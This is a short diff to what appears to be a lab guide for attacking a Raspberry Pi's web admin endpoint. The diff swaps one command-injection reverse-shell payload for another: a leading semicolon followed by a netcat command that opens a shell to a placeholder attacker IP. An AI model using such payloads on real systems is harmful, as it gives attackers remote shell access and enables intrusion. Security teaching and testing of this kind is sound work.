@@ -171,7 +171,7 @@ curl http://<Pi_IP>:8080/admin
 
    **Netcat**
    ```
-   ; nc -e /bin/bash <攻擊者IP> 4444
+   ; nc -c sh <攻擊者IP> 4444
    ```
 
    **Python3**
